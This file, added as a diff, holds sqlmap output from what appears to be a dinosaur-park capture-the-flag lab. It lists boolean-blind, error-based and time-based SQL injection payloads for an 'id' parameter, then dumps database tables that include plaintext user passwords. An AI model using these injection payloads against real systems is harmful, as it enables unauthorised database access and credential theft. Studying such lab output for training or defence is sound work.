@@ -1,0 +1,39 @@
+sqlmap identified the following injection point(s) with a total of 442 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 1479=1479
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 2406 FROM(SELECT COUNT(*),CONCAT(0x7176707671,(SELECT (ELT(2406=2406,1))),0x71786b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 5392 FROM (SELECT(SLEEP(5)))jyhV)
+---
+back-end DBMS: MySQL >= 5.0
+Database: park
+Table: users
+[2 entries]
++------+----------+------------+
+| id   | username | password   |
++------+----------+------------+
+| 1    |          | D0nt3ATM3  |
+| 2    |          | ih8dinos   |
++------+----------+------------+
+
+Database: park
+Table: items
+[5 entries]
++------+------+--------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| id   | sold | price  | package     | information                                                                                                                                                                            |
++------+------+--------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 1    | 4    | 500000 | Gold        | Childen under 5 can attend free of charge and will be eaten for free. This package includes a dinosaur lunch, tour around the park AND a FREE dinosaur egg from a dino of your choice! |
+| 2    | 11   | 250000 | Bronse      | Children under 5 can attend free of charge and eat free. This package includes a tour around the park and a dinosaur lunch! Try different dino's and rate the best tasting one!        |
+| 3    | 27   | 100000 | Basic       | Children under 5 can attend for free and eat free. This package will include a basic tour around the park in the brand new automated cars!                                             |
+| 5    | 0    | 0      | Development | Dennis, why have you blocked these characters: ' # DROP - username @ ---- Is this our WAF now?                                                                                         |
+| 100  | -1   | -1     | ...         | Nope                                                                                                                                                                                   |
++------+------+--------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
